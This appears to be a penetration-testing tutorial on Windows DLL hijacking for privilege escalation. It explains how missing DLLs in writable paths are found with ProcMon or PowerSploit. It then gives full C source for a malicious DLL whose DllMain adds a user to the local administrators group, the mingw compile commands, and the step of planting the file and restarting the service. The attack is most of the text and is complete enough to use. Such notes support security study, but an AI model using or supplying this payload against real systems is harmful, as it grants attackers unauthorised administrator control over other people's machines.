
When windows starts up a service or an application, it looks for the relevant `.dll` files for that particular application/service. If one of these dlls do not exist in a writable path, we can exploit it to execute a malicious payload crafted as a dll.

For this example, we are going to take a shortcut and use the Process Monitor (`ProcMon`) application to identify which `.dll` files are missing. The issue with this approach is we already need to have admin rights to run this application.

In a real world scenario we can use an automated script such as `Powersploit` to automatically identify such services and .dll files.

```C
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

```bash
$ x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
```

Now we simply need to save this dll in the location we identifies with the correct name are restart the service.